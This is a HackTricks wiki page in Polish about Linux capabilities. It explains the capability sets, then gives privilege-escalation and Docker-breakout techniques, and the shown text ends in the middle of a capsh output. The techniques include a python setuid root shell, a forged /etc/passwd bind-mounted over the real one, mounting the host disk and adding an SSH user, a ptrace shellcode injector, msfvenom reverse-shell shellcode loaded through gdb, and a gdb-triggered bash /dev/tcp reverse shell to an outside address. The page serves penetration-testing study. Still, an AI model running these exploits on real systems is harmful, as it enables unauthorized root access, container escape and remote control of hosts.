# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z dziedziny technologii i cyberbezpieczeństwa w każdej dyscyplinie.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities dzielą **uprawnienia roota na mniejsze, odrębne jednostki**, pozwalając procesom na posiadanie podzbioru uprawnień. Minimalizuje to ryzyko, nie przyznając niepotrzebnie pełnych uprawnień roota.

### Problem:
- Zwykli użytkownicy mają ograniczone uprawnienia, co wpływa na zadania takie jak otwieranie gniazda sieciowego, które wymaga dostępu roota.

### Zestawy uprawnień:

1. **Inherited (CapInh)**:
- **Cel**: Określa uprawnienia przekazywane z procesu nadrzędnego.
- **Funkcjonalność**: Gdy tworzony jest nowy proces, dziedziczy on uprawnienia z procesu nadrzędnego w tym zestawie. Przydatne do utrzymania pewnych uprawnień podczas uruchamiania procesów.
- **Ograniczenia**: Proces nie może uzyskać uprawnień, których nie posiadał jego proces nadrzędny.

2. **Effective (CapEff)**:
- **Cel**: Reprezentuje rzeczywiste uprawnienia, które proces wykorzystuje w danym momencie.
- **Funkcjonalność**: To zestaw uprawnień sprawdzany przez jądro w celu przyznania zgody na różne operacje. Dla plików, ten zestaw może być flagą wskazującą, czy dozwolone uprawnienia pliku mają być uznawane za skuteczne.
- **Znaczenie**: Zestaw skuteczny jest kluczowy dla natychmiastowych kontroli uprawnień, działając jako aktywny zestaw uprawnień, które proces może wykorzystać.

3. **Permitted (CapPrm)**:
- **Cel**: Definiuje maksymalny zestaw uprawnień, które proces może posiadać.
- **Funkcjonalność**: Proces może podnieść uprawnienie z zestawu dozwolonego do swojego zestawu skutecznego, dając mu możliwość użycia tego uprawnienia. Może również zrezygnować z uprawnień z zestawu dozwolonego.
- **Granica**: Działa jako górna granica dla uprawnień, które proces może mieć, zapewniając, że proces nie przekroczy swojego zdefiniowanego zakresu uprawnień.

4. **Bounding (CapBnd)**:
- **Cel**: Ustala sufit dla uprawnień, które proces może kiedykolwiek nabyć w trakcie swojego cyklu życia.
- **Funkcjonalność**: Nawet jeśli proces ma określone uprawnienie w swoim zestawie dziedzicznym lub dozwolonym, nie może nabyć tego uprawnienia, chyba że jest ono również w zestawie ograniczającym.
- **Przykład użycia**: Ten zestaw jest szczególnie przydatny do ograniczania potencjału eskalacji uprawnień procesu, dodając dodatkową warstwę bezpieczeństwa.

5. **Ambient (CapAmb)**:
- **Cel**: Pozwala na utrzymanie niektórych uprawnień podczas wywołania systemowego `execve`, które zazwyczaj skutkowałoby pełnym resetem uprawnień procesu.
- **Funkcjonalność**: Zapewnia, że programy nie-SUID, które nie mają związanych uprawnień plików, mogą zachować pewne uprawnienia.
- **Ograniczenia**: Uprawnienia w tym zestawie podlegają ograniczeniom zestawów dziedzicznych i dozwolonych, zapewniając, że nie przekraczają one dozwolonych uprawnień procesu.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
For further information check:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Procesy i możliwości binarne

### Możliwości procesów

Aby zobaczyć możliwości dla konkretnego procesu, użyj pliku **status** w katalogu /proc. Ponieważ dostarcza więcej szczegółów, ograniczmy się tylko do informacji związanych z możliwościami Linuxa.\
Zauważ, że dla wszystkich działających procesów informacje o możliwościach są utrzymywane na poziomie wątku, a dla binariów w systemie pliki są przechowywane w atrybutach rozszerzonych.

Możesz znaleźć możliwości zdefiniowane w /usr/include/linux/capability.h

Możesz znaleźć możliwości bieżącego procesu w `cat /proc/self/status` lub wykonując `capsh --print`, a innych użytkowników w `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
To polecenie powinno zwrócić 5 linii w większości systemów.

* CapInh = Dziedziczone uprawnienia
* CapPrm = Dozwolone uprawnienia
* CapEff = Efektywne uprawnienia
* CapBnd = Zestaw ograniczający
* CapAmb = Zestaw uprawnień otoczenia
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Te liczby szesnastkowe nie mają sensu. Używając narzędzia capsh, możemy je zdekodować na nazwy uprawnień.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sprawdźmy teraz **capabilities** używane przez `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Chociaż to działa, istnieje inny, łatwiejszy sposób. Aby zobaczyć możliwości działającego procesu, po prostu użyj narzędzia **getpcaps**, a następnie jego identyfikatora procesu (PID). Możesz również podać listę identyfikatorów procesów.
```bash
getpcaps 1234
```
Sprawdźmy tutaj możliwości `tcpdump` po nadaniu binarnemu wystarczających uprawnień (`cap_net_admin` i `cap_net_raw`) do podsłuchiwania sieci (_tcpdump działa w procesie 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Jak widać, podane możliwości odpowiadają wynikom 2 sposobów uzyskiwania możliwości binarnego.\
Narzędzie _getpcaps_ używa wywołania systemowego **capget()** do zapytania o dostępne możliwości dla konkretnego wątku. To wywołanie systemowe potrzebuje jedynie podać PID, aby uzyskać więcej informacji.

### Możliwości Binarne

Binarne mogą mieć możliwości, które mogą być używane podczas wykonywania. Na przykład, bardzo często można znaleźć binarny `ping` z możliwością `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Możesz **wyszukiwać binaria z uprawnieniami** za pomocą:
```bash
getcap -r / 2>/dev/null
```
### Zrzucanie uprawnień za pomocą capsh

Jeśli zrzucimy uprawnienia CAP\_NET\_RAW dla _ping_, to narzędzie ping nie powinno już działać.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oprócz wyjścia samego _capsh_, polecenie _tcpdump_ również powinno zgłosić błąd.

> /bin/bash: /usr/sbin/tcpdump: Operacja niedozwolona

Błąd wyraźnie pokazuje, że polecenie ping nie ma pozwolenia na otwarcie gniazda ICMP. Teraz mamy pewność, że to działa zgodnie z oczekiwaniami.

### Usuń możliwości

Możesz usunąć możliwości binarnego pliku za pomocą
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Wyraźnie **możliwe jest przypisanie możliwości również do użytkowników**. To prawdopodobnie oznacza, że każdy proces wykonywany przez użytkownika będzie mógł korzystać z możliwości użytkownika.\
Na podstawie [tego](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [tego](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [tego](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) należy skonfigurować kilka plików, aby nadać użytkownikowi określone możliwości, ale plik przypisujący możliwości do każdego użytkownika to `/etc/security/capability.conf`.\
Przykład pliku:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Możliwości Środowiska

Kompilując następujący program, możliwe jest **uruchomienie powłoki bash w środowisku, które zapewnia możliwości**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Wewnątrz **bash uruchomionego przez skompilowany binarny ambient** można zaobserwować **nowe możliwości** (zwykły użytkownik nie będzie miał żadnej możliwości w sekcji "bieżącej").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Możesz **dodawać tylko te możliwości, które są obecne** zarówno w zestawie dozwolonym, jak i dziedziczonym.
{% endhint %}

### Binaries świadome możliwości/Binaries nieświadome możliwości

**Binaries świadome możliwości nie będą używać nowych możliwości** nadanych przez środowisko, jednak **binaries nieświadome możliwości będą je** używać, ponieważ ich nie odrzucą. To sprawia, że binaries nieświadome możliwości są podatne w specjalnym środowisku, które przyznaje możliwości binarnym.

## Możliwości usługi

Domyślnie **usługa działająca jako root będzie miała przypisane wszystkie możliwości**, a w niektórych przypadkach może to być niebezpieczne.\
Dlatego plik **konfiguracji usługi** pozwala **określić** **możliwości**, które chcesz, aby miała, **oraz** **użytkownika**, który powinien uruchomić usługę, aby uniknąć uruchamiania usługi z niepotrzebnymi uprawnieniami:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

Domyślnie Docker przypisuje kilka możliwości do kontenerów. Bardzo łatwo jest sprawdzić, które to możliwości, uruchamiając:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Z **misją promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów z dziedziny technologii i cyberbezpieczeństwa w każdej dyscyplinie.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Capabilities są przydatne, gdy **chcesz ograniczyć własne procesy po wykonaniu operacji z uprawnieniami** (np. po skonfigurowaniu chroot i powiązaniu z gniazdem). Mogą jednak być wykorzystywane przez przekazywanie im złośliwych poleceń lub argumentów, które są następnie uruchamiane jako root.

Możesz wymusić capabilities na programach za pomocą `setcap`, a zapytać o nie za pomocą `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` oznacza, że dodajesz zdolność („-” usunęłoby ją) jako Efektywną i Dozwoloną.

Aby zidentyfikować programy w systemie lub folderze z zdolnościami:
```bash
getcap -r / 2>/dev/null
```
### Przykład eksploatacji

W następującym przykładzie binarny plik `/usr/bin/python2.6` okazuje się być podatny na privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** potrzebne przez `tcpdump`, aby **pozwolić dowolnemu użytkownikowi na sniffing pakietów**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Szczególny przypadek "pustych" możliwości

[Z dokumentacji](https://man7.org/linux/man-pages/man7/capabilities.7.html): Należy zauważyć, że można przypisać puste zestawy możliwości do pliku programu, a zatem możliwe jest stworzenie programu z ustawionym identyfikatorem użytkownika-root, który zmienia efektywny i zapisany identyfikator użytkownika procesu wykonującego program na 0, ale nie przyznaje żadnych możliwości temu procesowi. Innymi słowy, jeśli masz binarny plik, który:

1. nie jest własnością roota
2. nie ma ustawionych bitów `SUID`/`SGID`
3. ma pusty zestaw możliwości (np.: `getcap myelf` zwraca `myelf =ep`)

to **ta binarka będzie działać jako root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** to bardzo potężna możliwość w systemie Linux, często porównywana do poziomu bliskiego roota z powodu swoich rozległych **uprawnień administracyjnych**, takich jak montowanie urządzeń czy manipulowanie funkcjami jądra. Chociaż jest niezbędna dla kontenerów symulujących całe systemy, **`CAP_SYS_ADMIN` stwarza znaczące wyzwania bezpieczeństwa**, szczególnie w środowiskach kontenerowych, z powodu swojego potencjału do eskalacji uprawnień i kompromitacji systemu. Dlatego jej użycie wymaga rygorystycznych ocen bezpieczeństwa i ostrożnego zarządzania, z silnym naciskiem na rezygnację z tej możliwości w kontenerach specyficznych dla aplikacji, aby przestrzegać **zasady najmniejszych uprawnień** i zminimalizować powierzchnię ataku.

**Przykład z binarką**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Używając Pythona, możesz zamontować zmodyfikowany plik _passwd_ na prawdziwym pliku _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
A na koniec **zamontuj** zmodyfikowany plik `passwd` w `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I będziesz mógł **`su` jako root** używając hasła "password".

**Przykład z środowiskiem (Docker breakout)**

Możesz sprawdzić włączone możliwości wewnątrz kontenera docker za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyjściu można zobaczyć, że zdolność SYS\_ADMIN jest włączona.

* **Mount**

To pozwala kontenerowi docker na **zamontowanie dysku hosta i swobodne do niego uzyskanie dostępu**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Pełny dostęp**

W poprzedniej metodzie udało nam się uzyskać dostęp do dysku hosta docker.\
W przypadku, gdy stwierdzisz, że host uruchamia serwer **ssh**, możesz **utworzyć użytkownika wewnątrz dysku hosta docker** i uzyskać do niego dostęp przez SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Oznacza to, że możesz uciec z kontenera, wstrzykując shellcode do procesu działającego w hoście.** Aby uzyskać dostęp do procesów działających w hoście, kontener musi być uruchomiony przynajmniej z **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** przyznaje możliwość korzystania z funkcji debugowania i śledzenia wywołań systemowych dostarczanych przez `ptrace(2)` oraz wywołań cross-memory attach, takich jak `process_vm_readv(2)` i `process_vm_writev(2)`. Chociaż jest to potężne narzędzie do celów diagnostycznych i monitorujących, jeśli `CAP_SYS_PTRACE` jest włączone bez restrykcyjnych środków, takich jak filtr seccomp na `ptrace(2)`, może to znacząco osłabić bezpieczeństwo systemu. W szczególności może być wykorzystywane do obejścia innych ograniczeń bezpieczeństwa, zwłaszcza tych nałożonych przez seccomp, co zostało udowodnione przez [dowody koncepcyjne (PoC) takie jak ten](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Przykład z binarką (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Przykład z binarnym (gdb)**

`gdb` z uprawnieniem `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Utwórz shellcode za pomocą msfvenom, aby wstrzyknąć go do pamięci za pomocą gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debuguj proces root za pomocą gdb i skopiuj-wklej wcześniej wygenerowane linie gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Przykład z otoczeniem (wyjście z Dockera) - Inne nadużycie gdb**

Jeśli **GDB** jest zainstalowany (lub możesz go zainstalować za pomocą `apk add gdb` lub `apt install gdb`, na przykład) możesz **debugować proces z hosta** i sprawić, by wywołał funkcję `system`. (Ta technika również wymaga uprawnienia `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, ale zostanie ono wykonane przez ten proces (więc uzyskaj rev shell).

{% hint style="warning" %}
Jeśli otrzymasz błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode w programie za pomocą gdb.
{% endhint %}

**Przykład z użyciem środowiska (Docker breakout) - Wstrzykiwanie shellcode**

Możesz sprawdzić włączone możliwości wewnątrz kontenera docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
